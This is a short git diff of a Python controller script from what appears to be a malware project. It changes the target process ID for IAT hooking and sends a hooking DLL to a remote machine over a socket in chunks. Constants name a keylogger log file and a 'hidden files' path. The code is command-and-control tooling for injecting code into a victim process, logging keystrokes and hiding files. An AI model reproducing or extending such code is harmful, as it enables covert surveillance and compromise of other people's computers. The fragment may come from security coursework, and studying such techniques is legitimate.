@@ -4,7 +4,7 @@ from threading import Thread
 import time
 from SocketManager import SocketManager
 
-IAT_HOOKING_PROCESS_ID = 3140
+IAT_HOOKING_PROCESS_ID = 10904
 IAT_HOOKING_DLL = r"IAT Hooking\\IATHookingDLL.dll"
 KEY_LOGGER_FILE = r"keyLogger.txt"
 HIDDEN_FILE_PATH = r"C:\Users\admin\Desktop\hidden files.txt"
@@ -159,7 +159,12 @@ if __name__ == '__main__':
         # IAT Hooking
         SocketManager.send_data(conn, "IAT_HOOKING")
         SocketManager.send_data(conn, str(IAT_HOOKING_PROCESS_ID))
-        dll_data = full_bin_file_to_buffer(IAT_HOOKING_DLL)
-        SocketManager.send_data(conn, dll_data)
+        # dll_data = full_bin_file_to_buffer(IAT_HOOKING_DLL)
+        #SocketManager.send_data(conn, dll_data)
+
+        for chunk in bin_file_to_buffer(IAT_HOOKING_DLL):
+            SocketManager.send_data(conn, chunk)
+
+        SocketManager.send_data(conn, "END_IAT_HOOKING")
 
 conn.close()
